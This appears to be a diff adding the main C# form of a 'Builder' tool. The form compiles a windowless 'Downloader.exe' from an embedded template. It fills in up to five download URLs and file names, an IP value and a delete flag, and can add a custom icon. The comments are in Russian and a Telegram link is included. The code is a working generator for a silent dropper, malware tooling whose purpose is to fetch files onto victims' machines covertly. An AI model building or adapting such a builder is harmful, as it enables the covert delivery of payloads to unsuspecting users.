@@ -1,0 +1,132 @@
+using System;
+using System.CodeDom.Compiler;
+using System.Collections.Generic;
+using System.Windows.Forms;
+using Microsoft.CSharp;
+
+namespace Builder
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+            textBox4.Enabled = false;
+            button2.Enabled = false;
+            Opacity = 0;
+            var timer = new System.Windows.Forms.Timer();
+            timer.Tick += new EventHandler((sender, e) =>
+            {
+                if ((Opacity += 0.05d) == 1) timer.Stop();
+            });
+            timer.Interval = 30;
+            timer.Start();
+        }
+
+        void Compiler()
+        {
+            var Params = new CompilerParameters
+            {
+                GenerateExecutable = true
+            };
+
+            Params.ReferencedAssemblies.Add("System.dll"); //Добавлем линк в исходный файл на System.dll
+
+            Params.ReferencedAssemblies.Add("System.Windows.Forms.dll"); //Тоже самое но на System.Windwos.Forms.dlle
+
+            Params.CompilerOptions += "\n/t:winexe"; //Убираем cmd окно путём объявления программы Windows приложением
+
+            if (checkBox1.Checked)
+            {
+                Params.CompilerOptions = $"/win32icon:{textBox4.Text}";
+            }
+
+            Params.OutputAssembly = "Downloader.exe"; //Имя исходного файла
+
+            var Source = Properties.Resources.Bild; //Путь к файлу с исходниками
+
+            Source = Source.Replace("[DynamicMessage1]", tDown1.Text);
+            Source = Source.Replace("[DynamicMessage2]", tFName1.Text);
+
+            Source = Source.Replace("[DynamicMessage3]", tDown2.Text);
+            Source = Source.Replace("[DynamicMessage4]", tFName2.Text);
+
+            Source = Source.Replace("[DynamicMessage5]", tDown3.Text);
+            Source = Source.Replace("[DynamicMessage6]", tFName3.Text);
+
+            Source = Source.Replace("[DynamicMessage7]", tDown4.Text);
+            Source = Source.Replace("[DynamicMessage8]", tFName4.Text);
+
+            Source = Source.Replace("[DynamicMessage9]", tDown5.Text);
+            Source = Source.Replace("[DynamicMessage10]", tFName5.Text);
+
+            Source = Source.Replace("[DynamicMessageIP]", textBox2.Text);
+            Source = Source.Replace("[DELETE]", newValue: "Del");
+
+            var settings = new Dictionary<string, string>
+                {
+                    { "CompilerVersion", "v4.0" } //Указываем версию framework-a 2.0
+                };
+
+
+
+            CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Source);
+
+
+            if (Results.Errors.Count > 0)
+
+            {
+                foreach (CompilerError err in Results.Errors)
+
+                    MessageBox.Show(err.ToString()); //Выводим циклом ошибки, если они есть
+            }
+
+            else
+
+            {
+
+                MessageBox.Show("Готово, файл появится в том же месте где и программа :)"); //Выводим сообщение что всё прошло успешно
+
+            }
+
+        }
+    
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+
+        private void checkBox1_CheckedChanged(object sender, EventArgs e)
+        {
+            textBox4.Enabled = checkBox1.Checked;
+            button2.Enabled = checkBox1.Checked;
+        }
+
+        private void textBox4_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            using (var open = new OpenFileDialog())
+            {
+                open.Title = "Select icon";
+                open.Filter = ".ico|*.ico";
+
+                if (open.ShowDialog() == DialogResult.OK)
+                {
+                    textBox4.Text = open.FileName;
+                }
+            }
+        }
+
+        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+            System.Diagnostics.Process.Start("https://t.me/KOTOV1337");
+        }
+
+    }
+}
